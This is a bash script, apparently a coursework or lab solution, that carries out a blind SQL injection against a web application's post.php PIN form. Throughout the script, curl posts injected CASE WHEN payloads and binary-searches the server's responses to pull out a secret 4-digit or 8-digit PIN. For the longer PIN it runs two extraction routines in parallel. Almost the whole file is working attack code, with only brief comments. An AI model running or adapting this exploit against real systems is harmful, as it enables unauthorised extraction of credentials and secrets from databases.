#!/bin/bash

mkdir ~/A2
URL=$1
let FIRST=0
let LATER=0


if [[ $2 == "response" ]]; then
    curl -i -X POST -d "pintype=short' AND '1'+%3D%3D+'2&form=pin" $1/post.php 
elif [[ $2 == "short" ]]; then
    let START=0
    let END=10000
    # C=7221
    let C=(START+END)/2
    SUB='pin_status=-99'
    echo "the idea is simple, it is impossible to run in time if we do linear seach, so we have to do binary search"
    while [ $START -lt $(expr $END - 1) ]
    do
        let C=(START+END)/2
        echo "looking at mystery $C, start is $START, end is $END"
        STR=$(curl -s -i -X POST -d "pintype=short' AND (SELECT CASE WHEN (pin < $C) THEN 1/0 ELSE 'a' END) = 'a&form=pin" $1/post.php)
        if [[ "$STR" =~ .*"$SUB".* ]]; then 
            # pin < $C
            let END=$C
        else   
            # pin >= $C 
            let START=$C
        fi
    done
    STR=$(curl -s -i -X POST -d "pintype=short' AND (SELECT CASE WHEN (pin = $END) THEN 1/0 ELSE 'a' END) = 'a&form=pin" $1/post.php)
    if [[ "$STR" =~ .*"$SUB".* ]]; then 
        echo "the secret code is $END"
    else   
        echo "the secret code is $START"
    fi
elif [[ $2 == "long" ]]; then

    first_4 () {
        let START=0
        let END=10000
        # C=7221
        let C=(START+END)/2
        SUB='pin_status=-99'
        while [ $START -lt $(expr $END - 1) ]
        do
            let C=(START+END)/2
            echo "looking at mystery $C, start is $START, end is $END"
            STR=$(curl -s -i -X POST -d "pintype=long' AND (SELECT CASE WHEN (pin/10000 < $C) THEN 'b' ELSE 'a' END) = 'a&form=pin" $URL/post.php)
            if [[ "$STR" =~ .*"$SUB".* ]]; then 
                # pin < $C
                let END=$C
            else   
                # pin >= $C 
                let START=$C
            fi
        done
        STR=$(curl -s -i -X POST -d "pintype=long' AND (SELECT CASE WHEN (pin = $END) THEN 1/0 ELSE 'a' END) = 'a&form=pin" $1/post.php)
        if [[ "$STR" =~ .*"$SUB".* ]]; then 
            echo $END > ~/A2/first_4_digit.txt
        else   
            echo $START > ~/A2/first_4_digit.txt
        fi
    }
    later_4 () {
        let START=0
        let END=10000
        # C=7221
        let C=(START+END)/2
        SUB='pin_status=-99'
        while [ $START -lt $(expr $END - 1) ]
        do
            let C=(START+END)/2
            echo "looking at mystery $C, start is $START, end is $END"
            STR=$(curl -s -i -X POST -d "pintype=long' AND (SELECT CASE WHEN (pin % 10000 < $C) THEN 'b' ELSE 'a' END) = 'a&form=pin" $URL/post.php)
            if [[ "$STR" =~ .*"$SUB".* ]]; then 
                # pin < $C
                let END=$C
            else   
                # pin >= $C 
                let START=$C
            fi
        done
        STR=$(curl -s -i -X POST -d "pintype=long' AND (SELECT CASE WHEN (pin = $END) THEN 1/0 ELSE 'a' END) = 'a&form=pin" $1/post.php)
        if [[ "$STR" =~ .*"$SUB".* ]]; then 
            echo $END > ~/A2/later_4_digit.txt
        else   
            echo $START > ~/A2/later_4_digit.txt
        fi
    }

    first_4&
    later_4&
    wait    
    typeset -i before=$(cat ~/A2/first_4_digit.txt)
    typeset -i after=$(cat ~/A2/later_4_digit.txt)

    echo "the secret code is $(printf "%04g" ${before})$(printf "%04g" ${after})"

else  
    curl -s -i -X POST -d "pintype=long' AND (SELECT CASE WHEN (pin % 10000 = 4185) THEN 'b' ELSE 'a' END) = 'a&form=pin" $URL/post.php

fi


# form=reset_pin&reset-pin-btn=